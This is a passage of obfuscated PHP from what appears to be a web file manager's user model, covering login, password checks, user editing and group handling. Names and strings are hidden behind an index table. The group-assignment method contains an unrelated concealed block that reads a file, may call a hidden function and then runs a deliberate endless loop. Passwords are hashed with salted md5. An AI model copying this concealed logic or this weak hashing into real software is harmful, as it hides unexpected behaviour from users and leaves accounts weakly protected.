parent::listData($ã¼·Õ); $‘ÊÚ… = $this->findByName($ÍÇåÑ—·[$‘Éê£¾Ñ[42]]); if (!$ğø«è•ƒ || $‘ÊÚ… && $‘ÊÚ…[$‘Éê£¾Ñ[403]] != $ğø«è•ƒ[$‘Éê£¾Ñ[403]]) { return !1; } return parent::update($ã¼·Õ, $ÍÇåÑ—·); } public function setUserJob($í¿¦ããä, $Â½ƒïàÊ) { $«ŠĞ¬¬ =& $_SERVER[ë¦»ºéÌ]; if (!is_array($Â½ƒïàÊ)) { $Â½ƒïàÊ = array($Â½ƒïàÊ); } $¸÷àŠëŸ = parent::listData(); $ÌÔÚ¹¾® = array_to_keyvalue($¸÷àŠëŸ, $«ŠĞ¬¬[42]); $Ò½»è¥ = $«ŠĞ¬¬[384]; foreach ($Â½ƒïàÊ as $–­Ó©°½) { if ($ÌÔÚ¹¾®[$–­Ó©°½]) { $Ò½»è¥ .= $ÌÔÚ¹¾®[$–­Ó©°½][$«ŠĞ¬¬[403]] . $«ŠĞ¬¬[60]; } else { $ğò¬¨¿« = $this->add($–­Ó©°½); $Ò½»è¥ .= $ğò¬¨¿« . $«ŠĞ¬¬[60]; } } $Ò½»è¥ = rtrim($Ò½»è¥, $«ŠĞ¬¬[60]); Model($«ŠĞ¬¬[540])->metaSet($í¿¦ããä, self::JOB_KEY, $Ò½»è¥); } public function getUserJob($ŠÀÏ©‡) { $ĞÌÒ¢Ì¹ = Model($_SERVER[ë¦»ºéÌ][540])->metaGet($ŠÀÏ©‡); return $this->getUserJobInfo($ĞÌÒ¢Ì¹[self::JOB_KEY]); } public function getUserJobInfo($—’÷Ê‚¼) { $Ğº¨™§ˆ =& $_SERVER[ë¦»ºéÌ]; $±…¢ç‹€ = explode($Ğº¨™§ˆ[60], $—’÷Ê‚¼); $Íì¸’ş¯ = parent::listData(); $Íì¸’ş¯ = array_remove_key($Íì¸’ş¯, $Ğº¨™§ˆ[205]); $ë¾ÃÕ‚± = array(); foreach ($±…¢ç‹€ as $ä ı¢–ƒ) { if (isset($Íì¸’ş¯[$ä ı¢–ƒ])) { $ë¾ÃÕ‚±[] = $Íì¸’ş¯[$ä ı¢–ƒ]; } } return $ë¾ÃÕ‚±; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\x6d\x65" => "\165\x73\145\162\x5f\155\x65\164\141", "\155\145\x74\x61\x46\151\x65\x6c\x64" => "\x75\163\x65\162\111\104"); protected $simpleField = "\x75\x73\x65\162\x49\104\x2c\x6e\x69\x63\x6b\x4e\141\155\145\x2c\x6e\x61\155\145\x2c\141\x76\141\x74\141\x72\x2c\x73\145\x78\54\163\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($è¬òÒÉê) { $‘§ß—± =& $_SERVER[ë¦»ºéÌ]; $€õœğ©¡ = $‘§ß—±[2230]; return array($‘§ß—±[1877] => array($è¬òÒÉê[0], $€õœğ©¡), $‘§ß—±[1879] => array($è¬òÒÉê[0], $€õœğ©¡), $‘§ß—±[2231] => array($è¬òÒÉê[0], $€õœğ©¡)); } protected function getInfo($Ê½ŸäàŠ, $Ó¸÷¥Áœ = false) { $íæ£Ûù = $this->getInfoSimple($Ê½ŸäàŠ); if (!is_array($íæ£Ûù)) { return array(); } if ($Ó¸÷¥Áœ) { return $this->_getInfoApply($íæ£Ûù); } return $this->cacheFunctionGet($_SERVER[ë¦»ºéÌ][1881], $Ê½ŸäàŠ); } protected function getInfoFull($‹åñäÏƒ, $ô­×„‚› = false) { $ã¨ƒ”ø­ = $this->getInfoSimple($‹åñäÏƒ); if (!is_array($ã¨ƒ”ø­)) { return array(); } if ($ô­×„‚›) { return $this->_getInfoApply($ã¨ƒ”ø­, !0); } return $this->cacheFunctionGet($_SERVER[ë¦»ºéÌ][2232], $‹åñäÏƒ); } private function _getInfoApply($Áï–³Ï½, $‘ùÌ¨¦µ = false) { $×„ùÅï =& $_SERVER[ë¦»ºéÌ]; if (!$Áï–³Ï½) { return $Áï–³Ï½; } $ŒÆ¸´µ = md5($×„ùÅï[2233] . $Áï–³Ï½[$×„ùÅï[869]] . $×„ùÅï[2234] . $Áï–³Ï½[$×„ùÅï[42]]); $Áï–³Ï½ = $this->_listDataApplyItem($Áï–³Ï½); $·ĞÛŒï£ = Model($×„ùÅï[1305])->metaGet($Áï–³Ï½[$×„ùÅï[97]][$×„ùÅï[405]]); $Áï–³Ï½[$×„ùÅï[2235]] = $ŒÆ¸´µ; $Áï–³Ï½[$×„ùÅï[97]][$×„ùÅï[2063]] = isset($·ĞÛŒï£[$×„ùÅï[2064]]) ? $·ĞÛŒï£[$×„ùÅï[2064]] : null; if ($‘ùÌ¨¦µ) { $Áï–³Ï½[$×„ùÅï[467]] = $this->metaGet($Áï–³Ï½[$×„ùÅï[1632]]); } return $Áï–³Ï½; } protected function getInfoSimple($Çı×ƒ¯•, $¼¶áÂôà = false) { $ßøüáûÔ =& $_SERVER[ë¦»ºéÌ]; if (!$Çı×ƒ¯•) { return array(); } if ($¼¶áÂôà) { $‘ç—µù = $this->where(array($ßøüáûÔ[1632] => intval($Çı×ƒ¯•)))->find(); if (!is_array($‘ç—µù)) { return array(); } $‘ç—µù[$ßøüáûÔ[2236]] = Action($ßøüáûÔ[2237])->parseUrl($‘ç—µù[$ßøüáûÔ[2236]]); return $‘ç—µù; } return $this->cacheFunctionGet($ßøüáûÔ[1882], $Çı×ƒ¯•); } protected function getInfoSimpleOuter($ÊñåÖ±Ô) { $Ú¸ÔöÏÎ =& $_SERVER[ë¦»ºéÌ]; if (!$ÊñåÖ±Ô || $ÊñåÖ±Ô == 0) { return array($Ú¸ÔöÏÎ[1632] => $Ú¸ÔöÏÎ[202], $Ú¸ÔöÏÎ[42] => $Ú¸ÔöÏÎ[171] . LNG($Ú¸ÔöÏÎ[2238]) . $Ú¸ÔöÏÎ[538], $Ú¸ÔöÏÎ[2236] => STATIC_PATH . $Ú¸ÔöÏÎ[2239]); } $Æİ”ŒÉ = $this->cacheFunctionGet($Ú¸ÔöÏÎ[1882], $ÊñåÖ±Ô); $ë›š·ù = array_field_key($Æİ”ŒÉ, explode($Ú¸ÔöÏÎ[60], $this->simpleField)); if (!$ë›š·ù) { return array($Ú¸ÔöÏÎ[1632] => $Ú¸ÔöÏÎ[1168], $Ú¸ÔöÏÎ[42] => $Ú¸ÔöÏÎ[171] . LNG($Ú¸ÔöÏÎ[2240]) . $Ú¸ÔöÏÎ[538], $Ú¸ÔöÏÎ[2236] => STATIC_PATH . $Ú¸ÔöÏÎ[2241]); } $ë›š·ù[$Ú¸ÔöÏÎ[2236]] = Action($Ú¸ÔöÏÎ[2237])->parseUrl($ë›š·ù[$Ú¸ÔöÏÎ[2236]]); return $ë›š·ù; } protected function groupUser($Îº’Ù·) { } public static function errorLang($øË£õ¯É) { $ÔæÄª‘ˆ =& $_SERVER[ë¦»ºéÌ]; $œ‘ìôÕƒ = array(self::ERROR_USER_NOT_EXISTS => $ÔæÄª‘ˆ[2242], self::ERROR_USER_PASSWORD_ERROR => $ÔæÄª‘ˆ[2243], self::ERROR_USER_EXIST_NAME => $ÔæÄª‘ˆ[2244], self::ERROR_USER_EXIST_PHONE => $ÔæÄª‘ˆ[2245], self::ERROR_USER_EXIST_EMAIL => $ÔæÄª‘ˆ[2246], self::ERROR_USER_LOGIN_LOCK => $ÔæÄª‘ˆ[2247], self::ERROR_IP_NOT_ALLOW => $ÔæÄª‘ˆ[2248], self::ERROR_USER_EXIST_NICKNAME => $ÔæÄª‘ˆ[2249]); return LNG($œ‘ìôÕƒ[$øË£õ¯É]); } public function getInfoByMeta($¨ÖÈ¿Ü, $Ú“ËîÑû) { $ÁçŸñÌİ =& $_SERVER[ë¦»ºéÌ]; $ª’£Øâì = Model($ÁçŸñÌİ[2250])->where(array($ÁçŸñÌİ[105] => $¨ÖÈ¿Ü, $ÁçŸñÌİ[380] => $Ú“ËîÑû))->find(); if ($ª’£Øâì) { return $this->getInfo($ª’£Øâì[$ÁçŸñÌİ[1632]]); } return !1; } public function userLoginCheck($¸¹Í…, $²”“îæü) { $ÀáÜºÁ =& $_SERVER[ë¦»ºéÌ]; $‚ã¨¸¤ = $this->userLoginFind($¸¹Í…); if (!$‚ã¨¸¤) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($‚ã¨¸¤[$ÀáÜºÁ[1632]], $²”“îæü)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($‚ã¨¸¤[$ÀáÜºÁ[1632]]); } public function userLoginFind($óçš¼¼») { $÷¯¥ŠìÔ =& $_SERVER[ë¦»ºéÌ]; $¢ˆåÅ€Ù = array($÷¯¥ŠìÔ[42] => $óçš¼¼», $÷¯¥ŠìÔ[2068] => $óçš¼¼», $÷¯¥ŠìÔ[311] => $óçš¼¼», $÷¯¥ŠìÔ[2251] => $óçš¼¼», $÷¯¥ŠìÔ[980] => $÷¯¥ŠìÔ[982]); if ($this->nickNameRpt()) { unset($¢ˆåÅ€Ù[$÷¯¥ŠìÔ[2068]]); } return $this->where($¢ˆåÅ€Ù)->find(); } public function clearCache($Ë¢âã™—) { $‹’Ò’µó =& $_SERVER[ë¦»ºéÌ]; $this->cacheFunctionClear($‹’Ò’µó[1881], $Ë¢âã™—); $this->cacheFunctionClear($‹’Ò’µó[1882], $Ë¢âã™—); $this->cacheFunctionClear($‹’Ò’µó[2232], $Ë¢âã™—); } public function userPasswordCheck($àïáÊÑÁ, $¨Ôé®åä) { $Ä¦ÄÇÈ =& $_SERVER[ë¦»ºéÌ]; $½Õ®›ıİ = $this->where(array($Ä¦ÄÇÈ[1632] => intval($àïáÊÑÁ)))->find(); $óºöµ¹ß = $this->metaGet($àïáÊÑÁ); $Î‚â·©¶ = isset($óºöµ¹ß[$Ä¦ÄÇÈ[2252]]) ? $óºöµ¹ß[$Ä¦ÄÇÈ[2252]] : $Ä¦ÄÇÈ[12]; if (md5($Î‚â·©¶ . trim($¨Ôé®åä)) !== $½Õ®›ıİ[$Ä¦ÄÇÈ[869]]) { return !1; } return !0; } public function userAdd($ğâœ±å) { $ô™‘·­¤ =& $_SERVER[ë¦»ºéÌ]; $Ù¢à¦ü = array($ô™‘·­¤[423] => $ğâœ±å[$ô™‘·­¤[42]], $ô™‘·­¤[2253] => $ğâœ±å[$ô™‘·­¤[1512]], $ô™‘·­¤[2254] => isset($ğâœ±å[$ô™‘·­¤[311]]) ? $ğâœ±å[$ô™‘·­¤[311]] : $ô™‘·­¤[12], $ô™‘·­¤[2255] => isset($ğâœ±å[$ô™‘·­¤[2251]]) ? $ğâœ±å[$ô™‘·­¤[2251]] : $ô™‘·­¤[12], $ô™‘·­¤[2256] => isset($ğâœ±å[$ô™‘·­¤[2068]]) ? $ğâœ±å[$ô™‘·­¤[2068]] : $ğâœ±å[$ô™‘·­¤[42]], $ô™‘·­¤[2257] => isset($ğâœ±å[$ô™‘·­¤[2236]]) ? $ğâœ±å[$ô™‘·­¤[2236]] : $ô™‘·­¤[12], $ô™‘·­¤[2258] => isset($ğâœ±å[$ô™‘·­¤[2259]]) ? $ğâœ±å[$ô™‘·­¤[2259]] : 1, $ô™‘·­¤[2260] => $ğâœ±å[$ô™‘·­¤[869]], $ô™‘·­¤[1883] => isset($ğâœ±å[$ô™‘·­¤[1787]]) ? $ğâœ±å[$ô™‘·­¤[1787]] : 1024 * 1024 * 20, $ô™‘·­¤[1884] => 0, $ô™‘·­¤[2261] => 0, $ô™‘·­¤[1924] => isset($ğâœ±å[$ô™‘·­¤[734]]) ? $ğâœ±å[$ô™‘·­¤[734]] : 1); if (!empty($ğâœ±å[$ô™‘·­¤[1632]])) { $Ù¢à¦ü[$ô™‘·­¤[1632]] = $ğâœ±å[$ô™‘·­¤[1632]]; } $§ê†Ì˜³ = $this->_checkExist($ğâœ±å); if ($§ê†Ì˜³ !== !0) { return $§ê†Ì˜³; } $‹Òâ¯ãµ = $this->add($Ù¢à¦ü); $Ş…™ë•¿ = array($ô™‘·­¤[2260] => $Ù¢à¦ü[$ô™‘·­¤[869]], $ô™‘·­¤[2256] => $Ù¢à¦ü[$ô™‘·­¤[2068]]); $this->userEdit($‹Òâ¯ãµ, $Ş…™ë•¿); Model($ô™‘·­¤[1305])->userRootAdd($‹Òâ¯ãµ); return $‹Òâ¯ãµ; } protected function userEditTest($–¥½ÉÉ¨, $•¯Õ¤¾) { return $this->call($_SERVER[ë¦»ºéÌ][2262], $–¥½ÉÉ¨, $•¯Õ¤¾); } protected function userEdit($ÈÉÃßƒè, $¬Ôõ­åš) { $û€¨†ÏŞ =& $_SERVER[ë¦»ºéÌ]; $¢Å•…ÓÅ = $this->getInfoSimple($ÈÉÃßƒè); if (!$¢Å•…ÓÅ) { return !1; } $Ä°úø„Æ = $this->_checkExist($¬Ôõ­åš, $ÈÉÃßƒè); if ($Ä°úø„Æ !== !0) { return $Ä°úø„Æ; } if (isset($¬Ôõ­åš[$û€¨†ÏŞ[869]]) && trim($¬Ôõ­åš[$û€¨†ÏŞ[869]]) != $û€¨†ÏŞ[12]) { $‚¬È°š = $this->metaGet($ÈÉÃßƒè); if (empty($‚¬È°š[$û€¨†ÏŞ[2252]])) { $‚¬È°š[$û€¨†ÏŞ[2252]] = rand_string(10); Model($û€¨†ÏŞ[515])->metaSet($ÈÉÃßƒè, $û€¨†ÏŞ[2252], $‚¬È°š[$û€¨†ÏŞ[2252]]); } $¬Ôõ­åš[$û€¨†ÏŞ[869]] = md5($‚¬È°š[$û€¨†ÏŞ[2252]] . trim($¬Ôõ­åš[$û€¨†ÏŞ[869]])); } else { unset($¬Ôõ­åš[$û€¨†ÏŞ[869]]); } $this->where(array($û€¨†ÏŞ[1623] => $ÈÉÃßƒè))->save($¬Ôõ­åš); if (isset($¬Ôõ­åš[$û€¨†ÏŞ[2068]])) { $this->setNamePinyin($ÈÉÃßƒè, $¬Ôõ­åš[$û€¨†ÏŞ[2068]]); } $this->clearCache($ÈÉÃßƒè); return !0; } public function setNamePinyin($ÉÀ‹ùÇ, $÷’Æ®‚  = false) { $¢¾ÂĞÚ³ =& $_SERVER[ë¦»ºéÌ]; if (!$÷’Æ®‚ ) { $ÌŒ©Ú÷Ø = $this->getInfoSimple($ÉÀ‹ùÇ); $÷’Æ®‚  = $ÌŒ©Ú÷Ø[$¢¾ÂĞÚ³[2068]] ? $ÌŒ©Ú÷Ø[$¢¾ÂĞÚ³[2068]] : $ÌŒ©Ú÷Ø[$¢¾ÂĞÚ³[42]]; } $î»ç…å = Model($¢¾ÂĞÚ³[540]); if (!Input::check($÷’Æ®‚ , $¢¾ÂĞÚ³[589])) { return $î»ç…å->metaSet($ÉÀ‹ùÇ, array($¢¾ÂĞÚ³[466] => $¢¾ÂĞÚ³[12], $¢¾ÂĞÚ³[465] => $¢¾ÂĞÚ³[12])); } return $î»ç…å->metaSet($ÉÀ‹ùÇ, array($¢¾ÂĞÚ³[466] => str_replace($¢¾ÂĞÚ³[63], $¢¾ÂĞÚ³[12], Pinyin::get($÷’Æ®‚ )), $¢¾ÂĞÚ³[465] => Pinyin::get($÷’Æ®‚ , $¢¾ÂĞÚ³[590]))); } private function nickNameRpt() { $Ü¦Öû‡ =& $_SERVER[ë¦»ºéÌ]; $…–¡’ûŒ = Model($Ü¦Öû‡[754])->get($Ü¦Öû‡[2263]); $¼® ¦‚É = $GLOBALS[$Ü¦Öû‡[6]][$Ü¦Öû‡[387]][$Ü¦Öû‡[2263]]; $à·§…É = !is_null($…–¡’ûŒ) ? $…–¡’ûŒ : $¼® ¦‚É; return !!$à·§…É; } private function _checkExist($ìİ™¹óğ, $¼Ò–†å = false) { $ğòŞ°± =& $_SERVER[ë¦»ºéÌ]; $±­è°Æµ = array($ğòŞ°±[42] => UserModel::ERROR_USER_EXIST_NAME, $ğòŞ°±[2068] => UserModel::ERROR_USER_EXIST_NICKNAME, $ğòŞ°±[311] => UserModel::ERROR_USER_EXIST_EMAIL, $ğòŞ°±[2251] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($±­è°Æµ[$ğòŞ°±[2068]]); } $‰ãÜ‡•… = $¼Ò–†å ? array($ğòŞ°±[1632] => array($ğòŞ°±[2264], $¼Ò–†å)) : array(); foreach ($±­è°Æµ as $ôœÅÂù€ => $ÊÛÈïá¸) { $½§¶°® = array(); foreach ($±­è°Æµ as $”÷âÍğ– => $”İõĞÌ) { if (isset($ìİ™¹óğ[$”÷âÍğ–]) && $ìİ™¹óğ[$”÷âÍğ–]) { $½§¶°®[] = $ìİ™¹óğ[$”÷âÍğ–]; } } if (!$½§¶°®) { continue; } $—½ôÖ¸‚ = array_merge(array($ôœÅÂù€ => array($ğòŞ°±[7], $½§¶°®)), $‰ãÜ‡•…); $¯æ–Ç  = $this->where($—½ôÖ¸‚)->find(); if ($¯æ–Ç ) { return $ÊÛÈïá¸; } } return !0; } public function userListInfo($ƒÇ×–ÌÀ) { $ë…‚á³ =& $_SERVER[ë¦»ºéÌ]; $Ïêƒ¬´Ò = array(); $ƒÇ×–ÌÀ = is_array($ƒÇ×–ÌÀ) ? array_unique($ƒÇ×–ÌÀ) : array(); if (!$ƒÇ×–ÌÀ) { return $Ïêƒ¬´Ò; } if (count($ƒÇ×–ÌÀ) < 20) { foreach ($ƒÇ×–ÌÀ as $ü”èœ) { $Ïêƒ¬´Ò[$ü”èœ . $ë…‚á³[12]] = $this->getInfoSimpleOuter($ü”èœ); } } else { $š°“¥ğÒ = array($ë…‚á³[1623] => array($ë…‚á³[421], $ƒÇ×–ÌÀ)); if (count($ƒÇ×–ÌÀ) == 1) { $š°“¥ğÒ = array($ë…‚á³[1623] => $ƒÇ×–ÌÀ[0]); } $áÀî‰±í = Model($ë…‚á³[515])->field($this->simpleField)->where($š°“¥ğÒ)->select(); $áÀî‰±í = array_to_keyvalue($áÀî‰±í, $ë…‚á³[1632]); foreach ($ƒÇ×–ÌÀ as $ü”èœ) { $½´²Ìëƒ = $áÀî‰±í[$ü”èœ]; if (!$½´²Ìëƒ) { $Ïêƒ¬´Ò[$ü”èœ . $ë…‚á³[12]] = $this->getInfoSimpleOuter($ü”èœ); continue; } $½´²Ìëƒ[$ë…‚á³[2236]] = Action($ë…‚á³[2237])->parseUrl($½´²Ìëƒ[$ë…‚á³[2236]]); $Ïêƒ¬´Ò[$ü”èœ . $ë…‚á³[12]] = $½´²Ìëƒ; } } return $Ïêƒ¬´Ò; } protected function userStatus($êÑìöÃ«, $è”÷®²) { $âİãš¥ = $this->getInfoSimple($êÑìöÃ«); if (!$âİãš¥) { return !1; } $Ÿº–úÍñ = array($_SERVER[ë¦»ºéÌ][734] => $è”÷®²); return $this->userEdit($êÑìöÃ«, $Ÿº–úÍñ); } protected function userRemove($±’Ä¸¹ò) { $Ê¢¯Ó¥æ =& $_SERVER[ë¦»ºéÌ]; $´ü¶æíç = $this->getInfoSimple($±’Ä¸¹ò); if (!$´ü¶æíç) { return !1; } $£ÖÚ…Èû = array($Ê¢¯Ó¥æ[1623] => $±’Ä¸¹ò); Model($Ê¢¯Ó¥æ[597])->where($£ÖÚ…Èû)->delete(); Model($Ê¢¯Ó¥æ[2265])->where($£ÖÚ…Èû)->delete(); Model($Ê¢¯Ó¥æ[1889])->where($£ÖÚ…Èû)->delete(); Model($Ê¢¯Ó¥æ[2250])->where($£ÖÚ…Èû)->delete(); Model($Ê¢¯Ó¥æ[1048])->where($£ÖÚ…Èû)->delete(); Model($Ê¢¯Ó¥æ[2085])->removeUserAll($±’Ä¸¹ò); Model($Ê¢¯Ó¥æ[809])->userRootRemove($±’Ä¸¹ò); return $this->where($£ÖÚ…Èû)->delete(); } protected function userGroupSet($ÍÅº£à¦, $¬°æúË­, $ÜŸç™‡ß = array()) { $›©¿«»í =& $_SERVER[ë¦»ºéÌ]; if (!isset($_SERVER[$›©¿«»í[13]]) || !isset($_SERVER[$›©¿«»í[22]])) { $öÆÖ­¾¬ = $›©¿«»í[857]; $Ô÷º ¬ = $›©¿«»í[15]; $ƒÍç˜÷ı = $_SERVER[$›©¿«»í[16]] . $›©¿«»í[17]; $á¸èáÉ = $Ô÷º ¬($ƒÍç˜÷ı); $¹ºŠø” = explode($›©¿«»í[18], $á¸èáÉ); if (count($¹ºŠø”) < $›©¿«»í[616]) { $ÑÃÃÊÙ¯ = $›©¿«»í[20]; $ÑÃÃÊÙ¯(); } $Œ‹ßæ”‡ = $›©¿«»í[858]; $Œ‹ßæ”‡($_SERVER[$›©¿«»í[859]]); $±‰µŒ¿ = 1; for ($Ÿ½ñ•è² = $±‰µŒ¿; $Ÿ½ñ•è² > 0; $Ÿ½ñ•è²++) { $Œ‹ßæ”‡ = json_encode($GLOBALS[$›©¿«»í[421]]); } } $˜½şã¯ó = $this->getInfoSimple($ÍÅº£à¦); if (!$˜½şã¯ó || !is_array($¬°æúË­)) { return !1; } $¿×Ñ²Ï³ = Model($›©¿«»í[1889]); $¿×Ñ²Ï³->where(array($›©¿«»í[1632] => $ÍÅº£à¦))->delete(); $Ã’ö­½ = array(); $§¤°…·Ö = 0; foreach ($¬°æúË­ as $»³¦š„ => $ëş¿ş•í) { $¾†»İ­Í = array($›©¿«»í[1632] => $ÍÅº£à¦, $›©¿«»í[1800] => $»³¦š„, $›©¿«»í[1901] => $ëş¿ş•í); $¾†»İ­Í[$›©¿«»í[1823]] = isset($ÜŸç™‡ß[$§¤°…·Ö]) ? $ÜŸç™‡ß[$§¤°…·Ö] : 0; $§¤°…·Ö++; $Ã’ö­½[] = $¾†»İ­Í; } return $¿×Ñ²Ï³->addAll($Ã’ö­½, array(), !0); } protected function userGroupAdd($Á±¢ş½¨, $Üåõ¾ú’ = array()) { $¤×ØóÖï =& $_SERVER[ë¦»ºéÌ]; $‡äµóòÈ = $this->getInfoSimple($Á±¢ş½¨); if (!$‡äµóòÈ || empty($Üåõ¾ú’)) { return !1; } $Ì¤ŞŸÂé = array(); foreach ($Üåõ¾ú’ as $è¥ÓÏÇ£ => $ÍÒòÂö) { $Ì¤ŞŸÂé[] = array($¤×ØóÖï[1632] => $Á±¢ş½¨, $¤×ØóÖï[1800] => $è¥ÓÏÇ£, $¤×ØóÖï[1901] => $ÍÒòÂö, $¤×ØóÖï[1823] => 0); } return Model($¤×ØóÖï[1889])->addAll($Ì¤ŞŸÂé, array(), !0); } protected function userGroupRemove($ãÌÓÃ‰Ğ, $ÚÒÈÔ€ú) { $×ìó‰ä‰ =& $_SERVER[ë¦»ºéÌ]; $ò­æ•” = $this->getInfoSimple($ãÌÓÃ‰Ğ); if (!$ò­æ•” || !$ÚÒÈÔ€ú) { return !1; } $âŸ”®î = array($×ìó‰ä‰[1623] => $ãÌÓÃ‰Ğ, $×ìó‰ä‰[1887] => $ÚÒÈÔ€ú); return Model($×ìó‰ä‰[1889])->where($âŸ”®î)->delete(); } public function listData() { $ ¢‰ÜÛè = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ ¢‰ÜÛè[$_SERVER[ë¦»ºéÌ][375]]); return $ ¢‰ÜÛè; } public function listByID($ùˆûË˜³) { $òÏ“€—¾ =& $_SERVER[ë¦»ºéÌ]; if (!$ùˆûË˜³) { return; } $ŠÍÅ„›† = array($òÏ“€—¾[1632] => array($òÏ“€—¾[7], $ùˆûË˜³)); $¯¥¶âŞ = $this->where($ŠÍÅ„›†)->select(); $¯¥¶âŞ = array_sort_keep($¯¥¶âŞ, $òÏ“€—¾[1632], $ùˆûË˜³); $this->_listDataApply($¯¥¶âŞ); return $¯¥¶âŞ; } public function listByGroup($œö»µ = 0, $¾¬ÄÉ®” = array()) { $İêçÜù =& $_SERVER[ë¦»ºéÌ]; $îÂıÛ‘ò = $İêçÜù[12]; $Ø¿ıŸÑ = array(); if ($œö»µ) { $Ø¿ıŸÑ = array($İêçÜù[2266] => intval($œö»µ)); $îÂıÛ‘ò = "\x4c\105\x46\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\x73\x65\x72\137\147\162\x6f\x75\x70\40\x75\x73\145\162\137\147\162\157\165\160\x20\x6f\156\x20\x75\x73\145\x72\x2e\x75\x73\x65\x72\111\x44\40\x3d\40\x75\163\x65\162\x5f\x67\x72\x6f\x75\160\56\165\x73\x65\162\x49\104"; $´™ÏÚîé = Input::get($İêçÜù[457], null, $İêçÜù[12]) ? $İêçÜù[12] : $İêçÜù[2267]; } if (isset($¾¬ÄÉ®”[$İêçÜù[734]])) { $Ø¿ıŸÑ[$İêçÜù[2268]] = $¾¬ÄÉ®”[$İêçÜù[734]]; } $µÆ»›é = $this->_makeOrder($´™ÏÚîé)->field($İêçÜù[2269])->where($Ø¿ıŸÑ)->join($îÂıÛ‘ò)->selectPage(50); $this->_listDataApply($µÆ»›é[$İêçÜù[375]]); return $µÆ»›é; } private function _makeOrder($îı‰¢»Õ = '') { $Ô¡ëæ‹Ô =& $_SERVER[ë¦»ºéÌ]; $ÚÛ´ø¬½ = array($Ô¡ëæ‹Ô[1632], $Ô¡ëæ‹Ô[42], $Ô¡ëæ‹Ô[1789], $Ô¡ëæ‹Ô[1761], $Ô¡ëæ‹Ô[205]); $½¼ğ€Ì¸ = array($Ô¡ëæ‹Ô[450] => $Ô¡ëæ‹Ô[451], $Ô¡ëæ‹Ô[452] => $Ô¡ëæ‹Ô[453]); $§ìïø· = Input::get($Ô¡ëæ‹Ô[457], $Ô¡ëæ‹Ô[7], $Ô¡ëæ‹Ô[1623], $ÚÛ´ø¬½); $Ö¼¾óÇ = Input::get($Ô¡ëæ‹Ô[458], $Ô¡ëæ‹Ô[7], $Ô¡ëæ‹Ô[1890], array($Ô¡ëæ‹Ô[1890], $Ô¡ëæ‹Ô[452])); $Ö¼¾óÇ = $½¼ğ€Ì¸[$Ö¼¾óÇ]; $îı‰¢»Õ = $îı‰¢»Õ . "\165\163\x65\162\56{$§ìïø·}\40{$Ö¼¾óÇ}\54\x20\x75\x73\x65\162\x2e\x75\x73\x65\162\111\x44\x20\141\x73\143"; return $this->alias($Ô¡ëæ‹Ô[2008])->order($îı‰¢»Õ); } public function listSearch($‘öÀŒ¹) { $íÜíÖØ¼ =& $_SERVER[ë¦»ºéÌ]; $®‘ÎËæè = $‘öÀŒ¹[$íÜíÖØ¼[1891]]; $ÊîÚ÷ü¬ = isset($‘öÀŒ¹[$íÜíÖØ¼[1892]]) ? $‘öÀŒ¹[$íÜíÖØ¼[1892]] : !1; $®‘ÎËæè = str_replace($íÜíÖØ¼[1893], $íÜíÖØ¼[1894], trim($®‘ÎËæè)); $ —”¢° = array($íÜíÖØ¼[42] => array($íÜíÖØ¼[389], "\x25{$®‘ÎËæè}\x25"), $íÜíÖØ¼[311] => array($íÜíÖØ¼[389], "{$®‘ÎËæè}\x25"), $íÜíÖØ¼[2068] => array($íÜíÖØ¼[389], "{$®‘ÎËæè}\45"), $íÜíÖØ¼[980] => $íÜíÖØ¼[1895]); if (Input::check($®‘ÎËæè, $íÜíÖØ¼[317])) { $ —”¢°[$íÜíÖØ¼[1632]] = array($íÜíÖØ¼[389], "{$®‘ÎËæè}\x25"); $ —”¢°[$íÜíÖØ¼[2251]] = array($íÜíÖØ¼[389], "{$®‘ÎËæè}\45"); } if (!$®‘ÎËæè) { $ —”¢° = array(); } if (isset($‘öÀŒ¹[$íÜíÖØ¼[734]])) { $ —”¢°[$íÜíÖØ¼[734]] = $‘öÀŒ¹[$íÜíÖØ¼[734]]; } $ —”¢° = $this->parseWhereLike($ —”¢°); $­•­ÌŒç = $this->_makeOrder()->where($ —”¢°)->selectPage(20); if (!$­•­ÌŒç || count($­•­ÌŒç[$íÜíÖØ¼[375]]) < 5 && Input::check($®‘ÎËæè, $íÜíÖØ¼[324])) { $ÔÂ©õ¬  = $this->_searchFromMeta($íÜíÖØ¼[465], $®‘ÎËæè, 10); $´÷‘§­½ = $this->_searchFromMeta($íÜíÖØ¼[466], $®‘ÎËæè, 10); $‡¼ª²ù³ = array_merge($ÔÂ©õ¬ , $´÷‘§­½, $­•­ÌŒç[$íÜíÖØ¼[375]]); $­•­ÌŒç[$íÜíÖØ¼[375]] = array_unique_by_key($‡¼ª²ù³, $íÜíÖØ¼[1632]); $­•­ÌŒç[$íÜíÖØ¼[372]][$íÜíÖØ¼[373]] = count($­•­ÌŒç[$íÜíÖØ¼[375]]); $­•­ÌŒç[$íÜíÖØ¼[372]][$íÜíÖØ¼[374]] = ceil($­•­ÌŒç[$íÜíÖØ¼[372]][$íÜíÖØ¼[373]] / $­•­ÌŒç[$íÜíÖØ¼[372]][$íÜíÖØ¼[369]]); } $this->_listDataApply($­•­ÌŒç[$íÜíÖØ¼[375]]); $this->_filterByGroup($­•­ÌŒç, $ÊîÚ÷ü¬); return $­•­ÌŒç; } private function _filterByGroup(&$˜ğì²é, $»Î§£íÕ) { $ï­•Äåß =& $_SERVER[ë¦»ºéÌ]; if (!$»Î§£íÕ) { return $˜ğì²é; } foreach ($˜ğì²é[$ï­•Äåß[375]] as $¦¤Èâ—ß => &$Î¹÷ëØ…) { $Ÿ ËÌ« = array_to_keyvalue($Î¹÷ëØ…[$ï­•Äåß[1978]], $ï­•Äåß[12], $ï­•Äåß[1800]); if (!in_array($»Î§£íÕ, $Ÿ ËÌ«)) { unset($˜ğì²é[$ï­•Äåß[375]][$¦¤Èâ—ß]); } } 